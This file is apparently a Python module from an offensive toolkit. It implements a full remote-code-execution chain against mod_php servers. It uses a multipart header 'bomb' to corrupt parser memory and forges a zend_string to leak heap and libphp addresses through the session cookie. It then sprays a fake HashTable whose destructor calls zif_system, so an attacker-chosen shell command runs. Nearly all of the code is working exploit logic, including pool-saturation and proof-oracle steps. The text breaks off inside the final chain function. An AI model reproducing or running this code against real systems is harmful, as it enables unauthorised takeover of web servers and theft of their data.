"""78ResearchLab-class chain: N1 bomb arm, windowed disclosure, packed r0 sweep.

Provenance
----------
The class is published by ``78ResearchLab/PHP2Shell-Full-Chain-Exploit`` and
was adjudicated on the lab (``/root/php-cve-2026-10961x-rce-probe/78research``).
Three techniques are adopted here, all measured on our own lab:

* **windowed disclosure** — a named field carries a 79-byte forged
  ``zend_string`` header (``len`` at +0x10, ``'L'`` at +0x18) so the
  ``Set-Cookie: PHPSESSID=...`` dump is sized by the attacker: a 0x1000 probe
  yields the Zend chunk base, a 0x20000 dump yields ``zval_ptr_dtor``. This is
  a *leak stage*, not a terminal: the two bases are consumed by the same
  fire-stage geometry the stock family uses.
* **``r0`` page sweep** over ``0x50000..0xC0000`` step ``0x1000`` with packed
  low-bits ``{0x160,0x100,0x130,0x190}`` (four candidates per request) and a
  periodic re-leak (base-drift mitigation).
* **closed-loop filler calibration** from the leaked bytes
  (``v(\\d{4})x+`` -> filler count); coded, never load-bearing.

The arm is ours: the N1 two-byte header run (``":\\n"``, 320.8 B of parser heap
per 2 B of wire). The published exploit's 12 MiB single field is replaced by
that run inside the *published* multipart carrier shape (1001 tiny parts +
session carriers + the bomb part), which is the shape the disclosure was
calibrated against. Measured thresholds inside that shape:

===========  ==============  ==================  =====================
bracket      header lines    header wire         full arm wire
===========  ==============  ==================  =====================
8 MiB        50,537          101,074 B           192,589 B
128 MiB      427,050         854,100 B           932,589 B
===========  ==============  ==================  =====================

At the stock 128 MiB bracket the whole leak stage is arm 932,589 B +
disclosure 109,546 B: the first leak-capable pipeline measured on this lab
that stays under a 1.05 MB per-request budget. That is why it is the tool's
sub-cap pipeline for a mod_php front whose edge cap excludes the 66 MB field
fill and whose worker pool defeats the latched-worker class.

Preconditions (all measured, never assumed)
-------------------------------------------
``memory_limit`` inside the calibrated 8..200 MiB band, ``post_max_size`` above
the arm, ``max_input_vars``/parts cap >= ~1000 (the 1001-part carrier is the
mechanism), upload-progress on with a file part after the id/progress fields,
``use_strict_mode=0``, a PHP-handled path, mod_php/prefork, and a pool that can
be saturated to one free child (the holder doctrine) — all workers share the
master's ASLR layout, so one leaked base pair is valid across the pool.

Discipline
----------
The poison-then-sweep shape is the stock family's: one arm per worker (holders
occupy MRW-1), then the sweep probes candidate ``r0`` offsets. The sweep is
destructive to a worker's heap, so every page re-arms. A hit is confirmed only
by the proof channel (fetch or blind timing), never by response shape.
"""
from __future__ import annotations

import hashlib
import re
import secrets
import struct
import time
from collections import Counter
from typing import Optional

from . import registry
from .context import Context
from .doctrine import utc_iso

# ---------------------------------------------------------------------------
# measured geometry
# ---------------------------------------------------------------------------
MIB = 1 << 20

#: Header-run OOM thresholds measured inside the published carrier shape
#: (``78research/evidence/bisect-bomb-8M.log`` / ``bisect-bomb-128M.log``),
#: as (bracket MiB, header lines). The per-header cost is *not* constant in
#: this shape, so the ladder interpolates between measured anchors instead of
#: scaling the N1 constant.
ANCHORS = ((8, 50_537), (128, 427_050))
#: Per-MiB header slope above the 128 MiB anchor (derived from the two
#: anchors: (427,050-50,537)/(128-8) = 3,137.6 lines/MiB).
SLOPE_ABOVE_128 = 3_137.6
#: Margin over the bisected threshold: the published runs used 430,000 lines
#: at 128M (0.7% over) and 60,000 at 8M; 2% keeps the same order.
ARM_MARGIN = 1.02

#: Wire the arm adds around the header run: 1001 tiny parts, the carriers and
#: the part framing (measured: 932,589 B total at 427,050 lines x 2 B).
ARM_EXTRA_WIRE = 926_689 - 2 * 427_050

WINDOW_PROBE = 0x1000
WINDOW_FULL = 0x20000
FILLERS = 892
ARRAYS = 150
FORGE_BYTES = 79
SPRAY_VLEN = 4071
SPRAY_COUNT = 400
HT_PAGE_OFFSET = 0x800
TRIGGER_PADS = 32
TRIGGER_PAD_VALUE = 7

#: The published session id (19 bytes). Its length is part of the calibrated
#: heap layout: the forged header at +0x10 collides with the id's zend_string.
WINDOW_SID = b"attacksessionid0001"

#: ``r0`` sweep: the published window and its four packed low-bits.
R0_LO = 0x50000
R0_HI = 0xC0000
R0_STEP = 0x1000
LOWBITS = (0x160, 0x100, 0x130, 0x190)
RELEAK_EVERY = 24

PTR_MIN = 0x700000000000
PTR_MAX = 0x800000000000
HEAP_VOTE_MIN = 8
MODULE_VOTE_MIN = 4
ORDINARY_COOKIE_BYTES = 32

BOUNDARY = b"S" * 17
DISCLOSURE_BOUNDARY = b"B" * 10
TRIGGER_TIMEOUT = 120.0


def arm_lines(ml_mib) -> int:
    """Header-run line count for a bracket, from the measured anchors.

    Below the 8 MiB anchor the ladder scales from that anchor (the arm is
    small enough that a bracket-scaled fill is never the cap problem); above
    128 MiB it continues on the measured anchor slope so a 160/192 MiB build
    is still reachable. The result carries :data:`ARM_MARGIN`.
    """
    try:
        bracket = float(ml_mib)
    except (TypeError, ValueError):
        raise ValueError(f"memory bracket must be numeric, got {ml_mib!r}") from None
    if bracket <= ANCHORS[0][0]:
        lines = ANCHORS[0][1] * bracket / ANCHORS[0][0]
    elif bracket <= ANCHORS[1][0]:
        (lo_mib, lo_lines), (hi_mib, hi_lines) = ANCHORS
        lines = lo_lines + (hi_lines - lo_lines) * (bracket - lo_mib) / (
            hi_mib - lo_mib
        )
    else:
        lines = ANCHORS[1][1] + (bracket - ANCHORS[1][0]) * SLOPE_ABOVE_128
    return int(lines * ARM_MARGIN) + 1


def arm_wire(ml_mib) -> int:
    """Wire bytes of the arm body at ``ml_mib`` (header run + carriers)."""
    return 2 * arm_lines(ml_mib) + ARM_EXTRA_WIRE


def disclosure_wire(
    window: int = WINDOW_FULL,
    arrays: int = ARRAYS,
    fillers: int = FILLERS,
) -> int:
    """Wire bytes of the disclosure POST (measured 109,546 B at 892/150/0x20000).

    The three knobs are the published ones; the arithmetic is exact against
    the published shape so a cap decision never guesses.
    """
    return len(_parts_to_body(_disclosure_parts(window, arrays, fillers),
                              DISCLOSURE_BOUNDARY))


def rotate_wire(ml_mib=None) -> int:
    """Wire of the published pool-normalisation fill at ``ml_mib``.

    The fill is 1001 x 3000 B pads plus the arm part (3.18 MB at 8M, 3.95 MB
    at 128M). It is the largest request of the leak stage where the front cap
    admits it; a cap below it skips the fill (the arm + disclosure pair still
    fits, which is the sub-1 MiB shape measured at the stock bracket).
    """
    bracket = ANCHORS[-1][0] if ml_mib is None else ml_mib
    base = len(_parts_to_body(_rotate_fill_parts(0), BOUNDARY))
    return base + 2 * arm_lines(bracket)


def leak_wire(ml_mib=None, ceiling=None) -> int:
    """The largest request the leak stage will actually send at ``ml_mib``.

    An unknown bracket is sized at the 128 MiB anchor: the arm is the only
    bracket-dependent request, and the largest calibrated anchor is the honest
    worst case for a cap decision (never the smallest). A measured cap below
    the rotate fill means that request is skipped, not sent.
    """
    bracket = ANCHORS[-1][0] if ml_mib is None else ml_mib
    largest = max(arm_wire(bracket), disclosure_wire())
    rotate = rotate_wire(bracket)
    if ceiling is None or rotate <= int(ceiling):
        largest = max(largest, rotate)
    return largest


# ---------------------------------------------------------------------------
# wire shapes (byte-for-byte the published shapes)
# ---------------------------------------------------------------------------
def _parts_to_body(parts, boundary: bytes) -> bytes:
    """The published ``_mp`` renderer.

    ``multipart_frames`` cannot express the published bomb part: its header
    run is inserted *directly* after the disposition line (a bare ``":\\n"``
    run, then ``\\r\\n\\r\\n``), whereas the generic renderer inserts CRLFs
    around an extra block. The header line count is the allocation the OOM
    lands in, so the two bytes matter.
    """
    out = bytearray()
    for part in parts:
        name = part[0]
        data = part[1]
        filename = part[2] if len(part) > 2 else None
        extra = part[3] if len(part) > 3 else None
        out += b"--" + boundary + b"\r\n"
        out += b'Content-Disposition: form-data; name="' + str(name).encode() + b'"'
        if filename is not None:
            out += b'; filename="' + str(filename).encode() + b'"'
            out += b"\r\nContent-Type: application/octet-stream"
        if extra:
            out += extra
        out += b"\r\n\r\n" + data + b"\r\n"
    out += b"--" + boundary + b"--\r\n"
    return bytes(out)


def _arm_parts(lines: int) -> list:
    """The published arm shape with our N1 line as the bomb part.

    Exactly the published ``_leak_request`` fill: 1001 one-byte fields named
    ``pNNNN``, the session carriers, the tiny file part, then the bomb part.
    The disclosure's heap geometry is calibrated against this shape.
    """
    parts = [(f"p{i:04d}", b"x") for i in range(1001)]
    parts += [
        ("PHPSESSID", b"\x00"),
        ("PHP_SESSION_UPLOAD_PROGRESS", b"pwn"),
        ("f", b"A" * 64, "a.txt"),
        ("big", b"B" * 64, None, b":\n" * int(lines)),
    ]
    return parts


def _disclosure_parts(window: int, arrays: int, fillers: int) -> list:
    """The published disclosure shape: fillers, forged header, arrays."""
    parts = [
        ("PHPSESSID", WINDOW_SID),
        ("PHP_SESSION_UPLOAD_PROGRESS", b"pwn"),
    ]
    for index in range(int(fillers)):
        parts.append((str(1000 + index), (f"v{index:04d}" + "x" * 44)[:48].encode()))
    forge = bytearray(b"A" * FORGE_BYTES)
    struct.pack_into("<Q", forge, 0x10, int(window))
    forge[0x18] = ord("L")
    parts.append(("1999", bytes(forge)))
    for index in range(int(arrays)):
        parts.append((f"a{index:04d}[0]", b"x"))
    return parts


def trigger(ctx: Context, lines: int, *, note: str = "transplant:trigger") -> dict:
    """Send the published r0 trigger (32 pads + carriers + bomb part)."""
    body = _parts_to_body(_trigger_parts(lines), BOUNDARY)
    raw = _post(ctx, body, BOUNDARY, note=note)
    match = re.match(rb"HTTP/1\.[01] (\d{3})", raw.split(b"\r\n", 1)[0])
    status = int(match.group(1)) if match else 0
    return {
        "status": status,
        "wire": len(body),
        "oom_text": b"Allowed memory size" in raw,
        "refused": status in (411, 413, 414, 431),
        "blocked": status in (403, 406, 429, 451),
        "bytes": len(raw),
    }


def _trigger_parts(lines: int) -> list:
    """The published r0 trigger: carriers, 32 pads, file, bomb part."""
    parts = [("PHPSESSID", b"a" * 19), ("PHP_SESSION_UPLOAD_PROGRESS", b"pwn")]
    for index in range(TRIGGER_PADS):
        parts.append(
            (f"p{index:06d}"[:7], b"V" * TRIGGER_PAD_VALUE)
        )
    parts += [
        ("f", b"A" * 64, "a.txt"),
        ("big", b"B" * 64, None, b":\n" * int(lines)),
    ]
    return parts


# ---------------------------------------------------------------------------
# transport
# ---------------------------------------------------------------------------
def _post(ctx: Context, body: bytes, boundary: bytes, *, note: str,
          read_cap: int = 1 << 20, timeout: float = TRIGGER_TIMEOUT) -> bytes:
    headers = {"Content-Type": f"multipart/form-data; boundary={boundary.decode()}"}
    response = ctx.http.post(
        body,
        headers=headers,
        chunked=False,
        read_cap=read_cap,
        timeout=timeout,
        note=note,
    )
    return response.raw


def arm(ctx: Context, lines: int, *, note: str = "transplant:arm") -> dict:
    """Send one arm request; classify the response as parser death or refusal."""
    body = _parts_to_body(_arm_parts(lines), BOUNDARY)
    raw = _post(ctx, body, BOUNDARY, note=note)
    head = raw.split(b"\r\n", 1)[0]
    match = re.match(rb"HTTP/1\.[01] (\d{3})", head)
    status = int(match.group(1)) if match else 0
    oom = b"Allowed memory size" in raw
    return {
        "status": status,
        "wire": len(body),
        "oom_text": oom,
        "refused": status in (411, 413, 414, 431),
        "blocked": status in (403, 406, 429, 451),
        "bytes": len(raw),
    }


def disclosure(ctx: Context, window: int, arrays: int, *, fillers: int = FILLERS,
               note: str = "transplant:disclosure") -> bytes:
    """One disclosure POST -> URL-unquoted ``PHPSESSID`` cookie payload."""
    body = _parts_to_body(
        _disclosure_parts(window, arrays, fillers), DISCLOSURE_BOUNDARY
    )
    raw = _post(
        ctx, body, DISCLOSURE_BOUNDARY, note=note, read_cap=9 << 20, timeout=45.0
    )
    match = re.search(rb"Set-Cookie: PHPSESSID=([^\r\n]*?); path=/", raw)
    if not match:
        return b""
    import urllib.parse

    return urllib.parse.unquote_to_bytes(match.group(1).decode("latin1"))


# ---------------------------------------------------------------------------
# decoders (the published, independently measured algorithms)
# ---------------------------------------------------------------------------
def chunk_base(payload: bytes) -> tuple[int, int]:
    """2 MiB-masked pointer majority (>= 8 votes) -> (base, votes)."""
    if len(payload) < 1000:
        return 0, 0
    votes: Counter[int] = Counter()
    for index in range(len(payload) - 7):
        value = int.from_bytes(payload[index:index + 8], "little")
        if PTR_MIN <= value < PTR_MAX:
            votes[value & ~0x1FFFFF] += 1
    if not votes:
        return 0, 0
    base, hits = votes.most_common(1)[0]
    return (base if hits >= HEAP_VOTE_MIN else 0), hits


def libphp_base(payload: bytes, dtor: int) -> tuple[int, int]:
    """Page-aligned ``ptr - dtor`` majority (>= 4 votes) -> (base, votes)."""
    if len(payload) < 16 or not dtor:
        return 0, 0
    votes: Counter[int] = Counter()
    for index in range(0, len(payload) - 7, 8):
        value = int.from_bytes(payload[index:index + 8], "little")
        if PTR_MIN <= value < PTR_MAX and (value - dtor) % 0x1000 == 0:
            votes[value] += 1
    if not votes:
        return 0, 0
    pointer, hits = votes.most_common(1)[0]
    if hits < MODULE_VOTE_MIN:
        return 0, 0
    base = pointer - dtor
    return (base if base % 0x1000 == 0 else 0), hits


def decode(payload: bytes, dtor: int) -> dict:
    """Both bases from one disclosure payload, with the vote counts."""
    heap, heap_hits = chunk_base(payload)
    libphp, module_hits = libphp_base(payload, dtor)
    return {
        "heap": heap,
        "libphp": libphp,
        "heap_votes": heap_hits,
        "module_votes": module_hits,
        "cookie_bytes": len(payload),
        "closed": len(payload) == ORDINARY_COOKIE_BYTES,
        "absent": not payload,
    }


def calibrate_fillers(payload: bytes, current: int) -> int:
    """Published closed-loop filler count from a leaked ``vNNNNxxxx`` value."""
    match = re.fullmatch(rb"v(\d{4})x+", payload)
    if not match:
        return current
    index = int(match.group(1))
    return index if index and index != current else current


# ---------------------------------------------------------------------------
# leak stage
# ---------------------------------------------------------------------------
def _rotate_fill_parts(lines: int) -> list:
    """The published pool-normalisation fill (1001 x 3000 B pads + arm part)."""
    parts = [(f"f{i:04d}"[:5], b"V" * 3000) for i in range(1001)]
    parts += [
        ("PHPSESSID", b"\x00"),
        ("PHP_SESSION_UPLOAD_PROGRESS", b"pwn"),
        ("f", b"A" * 64, "a.txt"),
        ("big", b"B" * 64, None, b":\n" * int(lines)),
    ]
    return parts


def session_end(ctx: Context) -> None:
    """Register the disclosure session id (published rotate's second POST)."""
    body = _parts_to_body(
        [("PHPSESSID", WINDOW_SID), ("PHP_SESSION_UPLOAD_PROGRESS", b"pwn")],
        b"BNDRY12345",
    )
    _post(ctx, body, b"BNDRY12345", note="transplant:session-end",
          read_cap=65536, timeout=20.0)
    time.sleep(0.5)


def rotate(ctx: Context, lines: int, *, note: str = "transplant:rotate") -> dict:
    """Normalise the pool with the published 3 MB fill, then init the session."""
    body = _parts_to_body(_rotate_fill_parts(lines), BOUNDARY)
    raw = _post(ctx, body, BOUNDARY, note=note)
    match = re.match(rb"HTTP/1\.[01] (\d{3})", raw.split(b"\r\n", 1)[0])
    time.sleep(0.3)
    session_end(ctx)
    return {
        "status": int(match.group(1)) if match else 0,
        "wire": len(body),
        "oom_text": b"Allowed memory size" in raw,
    }


def stage(ctx: Context, *, lines: int, window: int, arrays: int,
          fillers: int, note: str) -> bytes:
    """One published leak stage: arm, then the disclosure consumer."""
    arm(ctx, lines, note=note + ":arm")
    time.sleep(0.2)
    return disclosure(ctx, window, arrays, fillers=fillers, note=note + ":disclose")


def leak(ctx: Context, *, lines: int, dtor: int, attempts: int = 3,
         fillers: int = FILLERS, arrays: int = ARRAYS,
         window_probe: int = WINDOW_PROBE, window_full: int = WINDOW_FULL,
         front_ceiling: Optional[int] = None) -> dict:
    """The published leak sequence: rotate, probe, then the full window.

    Every disclosure is preceded by its own arm (the latched state is consumed
    by one consumer). The probe sizes the disclosure to 0x1000 and yields the
    Zend chunk base; the full stage uses 0x20000 and the array fan-out to carry
    ``zval_ptr_dtor`` into the same cookie. Both requests must land on the
    same prefork child: the caller's holder doctrine leaves exactly one free.
    """
    result = {
        "heap": 0,
        "libphp": 0,
        "heap_votes": 0,
        "module_votes": 0,
        "cookie_bytes": 0,
        "attempts": 0,
        "producer": {},
        "fillers": fillers,
        "stages": [],
        "reason": "",
    }
    rotate_body_wire = rotate_wire()  # bracket-independent size check below
    skip_fill = bool(front_ceiling) and rotate_body_wire > int(front_ceiling)
    if skip_fill:
        result["fill_skipped"] = (
            f"rotate fill {rotate_body_wire} B > front cap {int(front_ceiling)} B"
        )
        session_end(ctx)
    else:
        result["producer"] = rotate(ctx, lines)
        if result["producer"].get("status") in (411, 413, 414, 431):
            result["reason"] = (
                f"front refused the rotate fill "
                f"(HTTP {result['producer']['status']})"
            )
            return result
    for attempt in range(1, int(attempts) + 1):
        result["attempts"] = attempt
        probe = stage(
            ctx, lines=lines, window=window_probe, arrays=0, fillers=fillers,
            note=f"transplant:probe:{attempt}",
        )
        decoded = decode(probe, dtor)
        result["stages"].append(
            {"stage": "probe", "window": window_probe,
             "cookie_bytes": decoded["cookie_bytes"],
             "heap": decoded["heap"], "libphp": decoded["libphp"]}
        )
        if not decoded["heap"]:
            fillers = calibrate_fillers(probe, fillers)
            result["fillers"] = fillers
            result["reason"] = (
                f"probe disclosed no heap pointer "
                f"(cookie {decoded['cookie_bytes']} B)"
            )
            if attempt < int(attempts) and not skip_fill:
                rotate(ctx, lines, note=f"transplant:rotate:{attempt}")
            continue
        result.update(
            heap=decoded["heap"],
            heap_votes=decoded["heap_votes"],
            cookie_bytes=decoded["cookie_bytes"],
        )
        full = stage(
            ctx, lines=lines, window=window_full, arrays=arrays,
            fillers=fillers, note=f"transplant:full:{attempt}",
        )
        full_decoded = decode(full, dtor)
        result["stages"].append(
            {"stage": "full", "window": window_full,
             "cookie_bytes": full_decoded["cookie_bytes"],
             "heap": full_decoded["heap"],
             "libphp": full_decoded["libphp"]}
        )
        result.update(
            heap=full_decoded["heap"] or result["heap"],
            libphp=full_decoded["libphp"],
            heap_votes=full_decoded["heap_votes"] or result["heap_votes"],
            module_votes=full_decoded["module_votes"],
            cookie_bytes=full_decoded["cookie_bytes"],
        )
        if result["heap"] and result["libphp"]:
            result["reason"] = ""
            return result
        result["reason"] = (
            f"full disclosure missing "
            f"{'heap' if not result['heap'] else 'libphp'} "
            f"(cookie {result['cookie_bytes']} B)"
        )
        if attempt < int(attempts) and not skip_fill:
            rotate(ctx, lines, note=f"transplant:rotate:{attempt}")
    return result


# ---------------------------------------------------------------------------
# fire stage: packed r0 sweep
# ---------------------------------------------------------------------------
def _payload(htdata: int, zif: int, cmd: bytes) -> bytes:
    """Fake HashTable with ``pDestructor = zif_system`` (published layout)."""
    table = bytearray(0x98 + len(cmd) + 1)
    struct.pack_into("<II", table, 0x00, 1, 7)
    struct.pack_into("<II", table, 0x08, 0x10, 0xFFFFFFF8)
    struct.pack_into("<Q", table, 0x10, htdata + 0x20)
    struct.pack_into("<II", table, 0x18, 1, 1)
    struct.pack_into("<II", table, 0x20, 8, 0)
    struct.pack_into("<Q", table, 0x30, zif)
    e = 0x20
    struct.pack_into("<I", table, e + 0x08, 6)
    struct.pack_into("<Q", table, e + 0x10, zif)
    struct.pack_into("<I", table, e + 0x2C, 1)
    struct.pack_into("<Q", table, e + 0x50, htdata + 0x80)
    struct.pack_into("<I", table, e + 0x58, 6)
    struct.pack_into("<II", table, 0x80, 1, 0x106)
    struct.pack_into("<Q", table, 0x90, len(cmd))
    table[0x98:0x98 + len(cmd)] = cmd
    return bytes(table)


def spray_value(page: int, zif: int, lowbits, cmd: bytes) -> bytes:
    """One 4071 B value carrying a fake reference per packed low-bit.

    Each candidate places a ``zend_reference`` ``{refcount=1, type_info=10,
    value=htdata, type=0x307}`` at ``(low & 0xFFF) - 0x18``; the fake
    HashTable sits at ``HT_PAGE_OFFSET - 0x18``. Four low-bits per value is
    the published packing (four candidate ``r0`` values per request).
    """
    htdata = page + HT_PAGE_OFFSET
    table = _payload(htdata, zif, cmd)
    buffer = bytearray(b"." * SPRAY_VLEN)
    for low in lowbits:
        offset = (int(low) & 0xFFF) - 0x18
        if offset < 0 or offset + 0x20 > SPRAY_VLEN:
            continue
        if HT_PAGE_OFFSET - 0x18 <= offset < HT_PAGE_OFFSET - 0x18 + len(table):
            continue
        struct.pack_into("<II", buffer, offset, 1, 10)
        struct.pack_into("<Q", buffer, offset + 0x08, htdata)
        struct.pack_into("<Q", buffer, offset + 0x10, 0x307)
        struct.pack_into("<Q", buffer, offset + 0x18, 0)
    start = HT_PAGE_OFFSET - 0x18
    buffer[start:start + len(table)] = table
    return bytes(buffer)


def fire_once(ctx: Context, *, heap: int, zif: int, page_off: int,
              lowbits, cmd: bytes, lines: int, rehearse_trigger: bool = True) -> dict:
    """One sweep attempt: arm the worker, spray the candidate, no verdict."""
    trigger_meta = {}
    if rehearse_trigger:
        trigger_meta = trigger(ctx, lines)
        time.sleep(0.3)
    page = (heap + int(page_off)) & ~0xFFF
    value = spray_value(page, zif, lowbits, cmd)
    parts = [("PHPSESSID", WINDOW_SID), ("PHP_SESSION_UPLOAD_PROGRESS", b"pwn")]
    for index in range(SPRAY_COUNT):
        parts.append((f"s{index:03d}", value))
    body = _parts_to_body(parts, DISCLOSURE_BOUNDARY)
    raw = _post(
        ctx, body, DISCLOSURE_BOUNDARY, note=f"transplant:spray:{page_off:#x}",
        read_cap=65536, timeout=45.0,
    )
    match = re.match(rb"HTTP/1\.[01] (\d{3})", raw.split(b"\r\n", 1)[0])
    return {
        "page_off": int(page_off) & ~0xFFF,
        "page": page,
        "htdata": page + HT_PAGE_OFFSET,
        "lowbits": [int(item) for item in lowbits],
        "trigger": trigger_meta,
        "spray_status": int(match.group(1)) if match else 0,
        "spray_wire": len(body),
    }


def _proof(ctx: Context, fetch_path: str, expect: bytes) -> tuple[bool, str]:
    """Confirm a sweep attempt through the fetch oracle."""
    from .chain import _fetch_proof

    found, body = _fetch_proof(ctx, fetch_path, expect)
    return found, body.decode("latin1", "replace").strip() if found else ""


def sweep(ctx: Context, *, heap: int, libphp: int, zif_offset: int,
          cmd: bytes, lines: int, r0_lo: int = R0_LO, r0_hi: int = R0_HI,
          r0_step: int = R0_STEP, lowbits=LOWBITS, packed: bool = True,
          releak_every: int = RELEAK_EVERY, attempts_limit: int = 0,
          fetch_path: str = "/o", expect: bytes = b"uid=",
          timing: bool = False, sleep_n: int = 5,
          leak_retry=None) -> dict:
    """Sweep candidate ``r0`` values until the proof channel confirms a hit.

    ``packed`` iterates one page per request with four low-bit candidates;
    the thorough variant iterates one candidate per request. A periodic
    re-leak replaces the bases when the ASLR generation or delta drifted.
    ``attempts_limit`` bounds the campaign budget (0 = the whole window).
    """
    pages = list(range(int(r0_lo), int(r0_hi), int(r0_step)))
    if packed:
        order = [(page, tuple(lowbits)) for page in pages]
    else:
        order = [(page, (low,)) for page in pages for low in lowbits]
    if attempts_limit:
        order = order[: int(attempts_limit)]
    result = {
        "pages": len(pages),
        "candidates": len(order),
        "packed": packed,
        "lowbits": [int(item) for item in lowbits],
        "attempts": [],
        "proof": {"found": False},
        "releaks": 0,
        "baseline_s": None,
        "verdict": "",
        "reason": "",
    }
    baseline = None
    if timing:
        # The published baseline is measured on a page outside the window
        # (0x8000): a sweep page that happened to hit would otherwise become
        # its own false baseline.
        began = time.monotonic()
        fire_once(
            ctx, heap=heap, zif=libphp + zif_offset, page_off=0x8000,
            lowbits=lowbits, cmd=cmd, lines=lines,
        )
        baseline = time.monotonic() - began
        result["baseline_s"] = round(baseline, 3)
    hit = None
    for index, (page_off, lows) in enumerate(order, 1):
        began = time.monotonic()
        attempt = fire_once(
            ctx, heap=heap, zif=libphp + zif_offset, page_off=page_off,
            lowbits=lows, cmd=cmd, lines=lines,
        )
        elapsed = time.monotonic() - began
        if timing:
            baseline = min(baseline, elapsed)
            result["baseline_s"] = round(baseline, 3)
            found = elapsed >= baseline + sleep_n * 0.5
            proof = (
                f"blind HIT: stage3 {elapsed:.1f}s >= "
                f"{baseline + sleep_n * 0.5:.1f}s (sleep {sleep_n}s executed)"
                if found
                else ""
            )
        else:
            time.sleep(0.5)
            found, proof = _proof(ctx, fetch_path, expect)
        attempt["elapsed_s"] = round(time.monotonic() - began, 2)
        attempt["hit"] = bool(found)
        result["attempts"].append(attempt)
        trigger = attempt.get("trigger") or {}
        if trigger.get("refused") or trigger.get("blocked"):
            result["verdict"] = (
                "PRODUCER_REFUSED" if trigger.get("refused")
                else "PRODUCER_BLOCKED"
            )
            result["reason"] = (
                f"the r0 trigger was answered {trigger.get('status')} before "
                "the parser saw it; the sweep window is not reachable"
            )
            return result
        if found:
            hit = attempt
            result["proof"] = {
                "found": True,
                "class": "transplant",
                "method": "forged zend_reference -> fake HashTable "
                "pDestructor=zif_system (r0 sweep)",
                "r0": attempt["page_off"] | (int(lows[0]) & 0xFFF),
                "page": attempt["page"],
                "table_address": attempt["htdata"],
                "zif_system": libphp + zif_offset,
                "receipt": proof,
                "receipt_sha256": hashlib.sha256(
                    proof.encode("utf-8", "replace")
                ).hexdigest(),
                "at": utc_iso(),
            }
            break
        if releak_every and index % int(releak_every) == 0 and leak_retry is not None:
            fresh = leak_retry()
            result["releaks"] += 1
            result["last_releak"] = {
                "heap": fresh.get("heap"),
                "libphp": fresh.get("libphp"),
            }
            if fresh.get("heap") and fresh.get("libphp"):
                heap, libphp = fresh["heap"], fresh["libphp"]
    if hit is not None:
        result["verdict"] = "PROVEN"
        ctx.proof = result["proof"]["receipt"].encode("utf-8", "replace")
        ctx.proof_source = "transplant:windowed-leak+r0-sweep"
        if ctx.ledger is not None:
            ctx.ledger.set_proof(ctx.proof)
    else:
        result["verdict"] = "NO_PROOF"
        result["reason"] = (
            f"no candidate in {len(order)} sweep attempts reached the proof "
            "channel; widen the r0 window or the low-bit set"
        )
    return result


# ---------------------------------------------------------------------------
# chain method
# ---------------------------------------------------------------------------
def _spray_wire() -> int:
    """Wire bytes of one spray body (measured shape, exact)."""
    value = spray_value(0, 0, LOWBITS, b"id>/tmp/p2s")
    parts = [("PHPSESSID", WINDOW_SID), ("PHP_SESSION_UPLOAD_PROGRESS", b"pwn")]
    parts += [(f"s{i:03d}", value) for i in range(SPRAY_COUNT)]
    return len(_parts_to_body(parts, DISCLOSURE_BOUNDARY))


def _unique_name() -> str:
    return "p2s" + secrets.token_hex(2)


def run_chain(ctx: Context) -> dict:
    """Execute the transplant class end to end."""
    from . import calibrate
    from .chain import WorkerHolders, choose_strategy
    from .registry import profile_for

    options = ctx.options
    profile = ctx.profile or {}
    version = profile.get("version") or ctx.version_text
    resolved = profile_for(version) if version else None
    if profile.get("zif") is None and resolved:
        profile = dict(profile)
        profile.update({key: resolved[key] for key in ("zif", "dtor", "table")})
        profile["version"] = resolved.get("version", version)
        ctx.profile = profile
    dtor = int(profile.get("dtor") or 0)
    zif_raw = profile.get("zif")
    if isinstance(zif_raw, (list, tuple)):
        zif_offset = int(zif_raw[0]) if zif_raw else 0
    else:
        zif_offset = int(zif_raw or 0)
    ml = profile.get("ml_mib") or profile.get("memory_limit_mib")
    if ml is None:
        # bracket from precheck checks when the profile was built from a
        # supplied file that omitted it
        ml = ((ctx.checks.get("ml_bracket") or {}).get("ml_mib"))
    if not dtor or not zif_offset:
        return {
            "phase": "chain",
            "method": "transplant_chain",
            "target": str(ctx.target),
            "verdict": "GEOMETRY_REFUSED",
            "error": (
                f"no measured offset pair for version {version!r}: the class is "
                "mod_php 8.4.x geometry; supply a profile or accept the banner tier"
            ),
        }
    if ml is None:
        return {
            "phase": "chain",
            "method": "transplant_chain",
            "target": str(ctx.target),
            "verdict": "GEOMETRY_REFUSED",
            "error": "memory bracket unknown: the arm cannot be sized",
        }
    lines = int(options.get("tr_arm_lines") or arm_lines(ml))
    workers = options.get("workers") or profile.get("workers") or ctx.signals.get(
        "workers"
    )
    if workers:
        profile["workers"] = int(workers)
    from . import precheck

    strategy = choose_strategy(
        workers, options, multiplexed=precheck.is_multiplexed(ctx.banner)
    )
    attempts = int(options.get("leak_attempts") or 3)
    command = options.get("command") or f"id>{_unique_name()}"
    if len(command.encode("latin1")) > 256:
        raise ValueError("command must be <= 256 bytes for this dispatch")
    expectation = (options.get("expect") or "uid=").encode()
    redirect = re.search(r">\s*(\S+)\s*$", command or "")
    proof_name = redirect.group(1) if redirect else _unique_name()
    fetch_path = options.get("fetch_path") or ("/" + proof_name.lstrip("/"))
    window_probe = int(options.get("tr_window_probe") or WINDOW_PROBE)
    window_full = int(options.get("tr_window_full") or WINDOW_FULL)
    timing = bool(options.get("tr_timing_oracle"))
    sleep_n = int(options.get("tr_sleep_seconds") or 5)
    packed = not bool(options.get("tr_thorough"))
    r0_lo = int(options.get("tr_r0_lo") if options.get("tr_r0_lo") is not None else R0_LO)
    r0_hi = int(options.get("tr_r0_hi") if options.get("tr_r0_hi") is not None else R0_HI)
    r0_step = int(options.get("tr_r0_step") or R0_STEP)
    lowbits = options.get("tr_lowbits") or list(LOWBITS)
    fillers = int(options.get("tr_fillers") or FILLERS)
    arrays = int(options.get("tr_arrays") if options.get("tr_arrays") is not None else ARRAYS)
    releak_every = int(options.get("tr_releak_every") or RELEAK_EVERY)
    ceiling = calibrate.cap_ceiling(ctx) or options.get("front_ceiling")
    started = time.monotonic()
    result = {
        "phase": "chain",
        "method": "transplant_chain",
        "class": "transplant_n1_bomb_windowed_disclosure_r0_sweep",
        "target": str(ctx.target),
        "profile": {
            "version": version,
            "ml_mib": ml,
            "dtor": dtor,
            "zif": zif_offset,
            "workers": profile.get("workers"),
            "source": profile.get("source"),
        },
        "worker_strategy": strategy,
        "wire": {
            "arm": arm_wire(ml),
            "arm_lines": lines,
            "rotate": rotate_wire(ml),
            "disclosure": disclosure_wire(WINDOW_FULL, arrays, fillers),
            "spray": _spray_wire(),
            "front_cap": ceiling,
        },
        "leak": {},
        "sweep": {},
        "attempts": [],
        "proof": {"found": False},
        "placement": options.get("placement") or "none",
        "verdict": "",
    }
    holders = None
    try:
